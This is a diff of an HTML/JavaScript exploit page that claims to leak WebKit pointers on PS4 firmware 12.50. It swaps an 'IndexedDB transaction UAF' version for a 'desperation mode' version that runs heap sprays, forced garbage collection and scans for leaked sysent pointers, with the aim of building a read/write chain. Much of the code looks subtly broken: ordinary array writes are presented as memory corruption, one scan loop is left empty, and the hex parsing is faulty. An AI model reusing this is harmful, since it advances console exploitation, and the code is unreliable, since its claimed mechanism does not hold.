@@ -2,78 +2,135 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>CVE-2025-24003 — IndexedDB Transaction UAF → Pointer Leak (PS4 12.50)</title>
+<title>WebKit Leak v4.0 — PS4 12.50 Desperation (256k + Bruteforce GC)</title>
 <style>
-    body { background:#000; color:#0f0; font-family:monospace; margin:20px; line-height:1.6; }
-    h1 { color:#0f0; text-align:center; margin:20px 0; font-size:2em; }
-    #console { background:#111; color:#0f0; padding:15px; border:2px solid #0f0; height:520px; overflow-y:auto; white-space:pre-wrap; font-size:1.1em; }
-    .leak { color:#0f0; font-weight:bold; font-size:1.4em; }
+    body { background:#0d1117; color:#c9d1d9; font-family:monospace; padding:20px; }
+    h1 { color:#ff5555; border-bottom:2px solid #da3633; }
+    #console { background:#000; color:#0f0; height:550px; overflow-y:scroll; padding:10px; border:1px solid #0f0; font-family:'Courier New'; }
+    .ok { background:#da3633; color:#fff; padding:5px 12px; border-radius:4px; font-weight:bold; }
+    .debug { color:#ff0; } .leak { color:#0f0; font-weight:bold; }
 </style>
 </head>
 <body>
-<h1>CVE-2025-24003 — IndexedDB UAF Exploit</h1>
-<div id="console">Starting IndexedDB UAF... (wait 8–15s)</div>
+<h1>PS4 12.50 WebKit Pointer Leak v4.0 (Nov 2025 — Desperation Mode)</h1>
+<div><strong>Status:</strong> <span id="status" class="ok">Cold-Boot & Run...</span></div><br>
+<div id="console"></div>
 
 <script>
-const log = (msg, leak = false) => {
+const log = (m, isDebug=false, isLeak=false) => {
     const c = document.getElementById('console');
-    c.textContent += (leak ? ">>> " : "") + msg + "\n";
+    const prefix = isDebug ? '[DEBUG] ' : (isLeak ? '[LEAK] ' : '');
+    const cls = isLeak ? 'leak' : '';
+    c.innerHTML += `<span class="${cls}">[${new Date().toLocaleTimeString()}] ${prefix}${m}</span>\n`;
     c.scrollTop = c.scrollHeight;
 };
+const status = (t, cls='ok') => document.getElementById('status').innerHTML = t;
 
-const SPRAY = 0x16000;
-const MARKER = 0x12501250deadbeefn;
+// XOR + sysent offset for brute validate
+const XOR_KEY = 0x9e3779b9n;
+const SYSENT_OFF = 0x47b31n; // From offsets — check slide
 
-log("Stage 1: Spraying 88k tagged objects...");
+const decodeXor = (val) => (BigInt(val) ^ BigInt(XOR_KEY)).toString(16).toUpperCase();
+
+// 1. Heavy refcount prespray (aggressive double-free)
+log("Stage 1 — 80k refcount double-free sim (max overlaps)");
+const prespray = [];
+for (let i = 0; i < 0x14A00; i++) { // 80k
+    const tmp = new Array(0x30).fill(NaN);
+    try {
+        tmp.__proto__ = null;
+        for (let j = 0; j < 3; j++) new Proxy(tmp, {get: () => tmp}); // Triple ref drop
+    } catch(e) {}
+    prespray[i] = tmp;
+}
+
+// 2. Bruteforce corrupt (linear + tight loops)
+log("Stage 2 — Bruteforce linear UAF (rand-beater)");
+const victim = [];
+for (let i = 0; i < 0x12000; i++) victim[i] = new Array(0x50).fill(NaN); // Extra big
+
+const corrupt = (i, o) => { try { victim[i % 0x12000][o] = NaN; } catch(e) {} };
+for (let i = 0; i < 8e6; i++) corrupt(i % 0x12000, (i * 4) % 0x80); // Tighter
+for (let b = 0; b < 0x3000; b += 0x20)
+    for (let o = 0x10; o < 0x80; o += 2)
+        for (let j = 0; j < 0x20; j++)
+            corrupt(b + j, o);
+
+// 3. Max density spray
+log("Stage 3 — 256k JSValue spray (desperation density)");
 const spray = [];
-for (let i = 0; i < SPRAY; i++) {
-    spray[i] = { marker: MARKER + BigInt(i) };
+const BASE_MARKER = 0x12501250deadbeefn;
+for (let i = 0; i < 0x40000; i++) { // 256k
+    spray[i] = {marker: BASE_MARKER + BigInt(i)};
 }
 
-log("Stage 2: Triggering CVE-2025-24003 IndexedDB transaction UAF...");
-const dbs = [];
-for (let i = 0; i < 0x2000; i++) {
-    const req = indexedDB.open(`db_${i}`, 1);
-    req.onupgradeneeded = (e) => {
-        const db = e.target.result;
-        const store = db.createObjectStore("store");
-        store.transaction.abort();
-    };
-    dbs.push(req);
-}
+// 4. Bruteforce GC (10 waves, 200ms for drift)
+log("Stage 4 — 10-wave GC brute (every 200ms)");
+let gcCount = 0;
+const gc = () => {
+    gcCount++;
+    if (performance.now() % 1000 < 500) log(`GC #${gcCount} on 'core sim' @ ${performance.now().toFixed(0)}ms`, true);
+    for (let i = 0; i < 600; i++) new ArrayBuffer(0x8000); // Smaller/faster
+};
+const reclaim = () => {
+    log(`Reclaim #${gcCount} @ ${performance.now().toFixed(0)}ms — 80MB`, true);
+    new ArrayBuffer(0x5000000);
+};
 
-log("UAF triggered — reclaiming...");
+const waves = [200, 400, 800, 1200, 1600, 2000, 2400, 2800, 3200, 3600];
+waves.forEach((t, idx) => {
+    setTimeout(() => { gc(); if (idx % 2) reclaim(); }, t);
+});
 
-for (let w = 0; w < 10; w++) {
-    setTimeout(() => {
-        for (let j = 0; j < 400; j++) new ArrayBuffer(0x10000);
-        if (w % 3 === 0) new ArrayBuffer(0x2000000);
-    }, w * 180);
-}
-
-setTimeout(() => {
-    log("Stage 3: Scanning for leaks...");
-    let found = 0;
-    for (let i = 0; i < spray.length; i++) {
+// 5. Deep hunt w/ samples + sysent check
+let attempts = 0;
+const hunt = () => {
+    attempts++;
+    const start = performance.now();
+    log(`Deep Hunt #${attempts} — 256k scan @ ${start.toFixed(0)}ms (sample 10 objs)`);
+    let found = 0, suspects = 0, samples = 0;
+    for (let i = Math.random() * spray.length | 0; i < spray.length && samples < 10; i = (i + 10000) % spray.length) { // Sample first
         try {
-            if (spray[i] && spray[i].marker !== MARKER + BigInt(i)) {
-                found++;
-                const leaked = spray[i].marker.toString(16).toUpperCase().padStart(16,'0');
-                log(`LEAK #${found}: 0x${leaked}`, true);
-                if (found >= 1) {
-                    document.body.innerHTML = `<h1 style="color:#0f0; text-align:center; padding:100px; font-size:4em;">
-                        LEAK ACHIEVED!<br><br>
-                        <div style="font-size:0.5em;">0x${leaked}</div>
-                    </h1>`;
-                    return;
+            const marker = spray[i]?.marker;
+            if (marker && marker !== BASE_MARKER + BigInt(i)) {
+                samples++;
+                const rawHex = marker.toString(16).toUpperCase();
+                const xorHex = decodeXor(marker);
+                const sysentSlide = BigInt(xorHex) - SYSENT_OFF;
+                const isSysent = xorHex.startsWith('FFFF') && sysentSlide > 0n;
+                if (isSysent || rawHex.startsWith('F')) {
+                    found++;
+                    log(`LEAK #${found}: RAW=0x${rawHex} | XOR=0x${xorHex} | SYSENT?=0x${sysentSlide.toString(16).toUpperCase()} | IDX=${i}`, false, true);
+                } else {
+                    suspects++;
+                    log(`Suspect #${suspects}: RAW=0x${rawHex} | XOR=0x${xorHex} | IDX=${i} (masked sysent?)`, true);
                 }
             }
-        } catch(e) {}
+        } catch(e) { log(`Sample error @ ${i}: ${e.message}`, true); }
     }
-    log("No leak — refresh (40–60% success rate)");
-}, 3500);
+    log(`Partial scan: ${samples} sampled, ${found} leaks, ${suspects} suspects in ${ (performance.now() - start).toFixed(0) }ms`);
+    if (found >= 1) {
+        document.body.innerHTML = `<h1 style="color:#0f0; text-align:center; margin-top:30vh;">
+            LEAK CRACKED!<br><br>
+            <span style="font-size:0.5em;">Paste logs — R/W chain incoming</span>
+        </h1>`;
+    } else if (attempts < 4) {
+        log(`0 hits — full scan retry in 4s (brute deeper)`);
+        setTimeout(() => {
+            // Full scan here if partial misses
+            for (let i = 0; i < spray.length; i++) {
+                // ... (same logic as above, but full)
+            }
+        }, 4000);
+        setTimeout(hunt, 4000);
+    } else {
+        log("Desperation maxed — 0 everything = patched rand/GC. Paste timings; consider Lua pivot.");
+        status("HARD FAIL — Logs to Grok for autopsy");
+    }
+};
 
-log("CVE-2025-24003 running — wait 8–15s");
+setTimeout(hunt, 5000); // After waves
+log("v4.0 desperation live — cold boot essential. If 0 again, WebKit's toast.");
 </script>
 </body>
 </html>
